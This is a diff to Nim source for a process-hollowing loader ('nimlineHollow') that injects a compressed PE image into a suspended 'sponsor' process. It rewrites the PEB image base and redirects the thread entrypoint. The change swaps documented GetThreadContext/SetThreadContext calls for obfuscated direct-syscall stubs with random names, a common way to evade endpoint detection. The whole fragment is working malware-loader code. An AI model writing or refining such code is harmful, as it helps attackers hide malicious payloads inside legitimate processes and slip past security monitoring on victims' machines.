@@ -226,7 +226,7 @@ proc nimlineHollow(compressedBase64PE: string, sponsorCmd: LPCSTR, ppid: int = 0
             peImageSectionsHeader[i].SizeOfRawData,
             NULL
         ) != 0:
-            when not defined(release): echo "[-] Could not write to sponsor process"
+            when not defined(release): echo "[-] Could not write headers to sponsor process"
             quit()
     
     # Overwrite sponsor PEB with the new image base address 
@@ -238,19 +238,26 @@ proc nimlineHollow(compressedBase64PE: string, sponsorCmd: LPCSTR, ppid: int = 0
         8,
         NULL
     ) != 0:
-        when not defined(release): echo "[-] Could not write to sponsor process"
+        when not defined(release): echo "[-] Could not write sections to sponsor process"
         quit()
 
     # Change sponsor thread Entrypoint
     var context: CONTEXT
     context.ContextFlags = CONTEXT_INTEGER
-    if GetThreadContext(sponsorThreadHandle, addr context) == FALSE:
-        when not defined(release): echo "[-] Error calling GetThreadContext()"
+    if VzpSdkMDEGHOzTpB( # NtGetContextThread
+        sponsorThreadHandle, 
+        addr context
+        ) != 0:
+        when not defined(release): echo "[-] Could not read from sponsor process PEB"
+        quit()
     var entryPoint = cast[DWORD64](peImageImageBase) + cast[DWORD64](peImageEntryPoint)
     when not defined(release): echo "[i] Changing RCX register to point the new entrypoint: 0x" & $context.Rcx.toHex & " -> 0x" & $entryPoint.toHex
     context.Rcx = cast[DWORD64](entryPoint)
-    if SetThreadContext(sponsorThreadHandle, addr context) == FALSE:
-        when not defined(release): echo "[-] Error calling SetThreadContext()"
+    if IGyhziwCULdezDSq( # NtSetContextThread
+        sponsorThreadHandle, addr context
+        ) != 0:
+        when not defined(release): echo "[-] Could not write to from sponsor process PEB"
+        quit()
     
     # Resume remote thread 
     when not defined(release): echo "[*] Resuming remote thread"
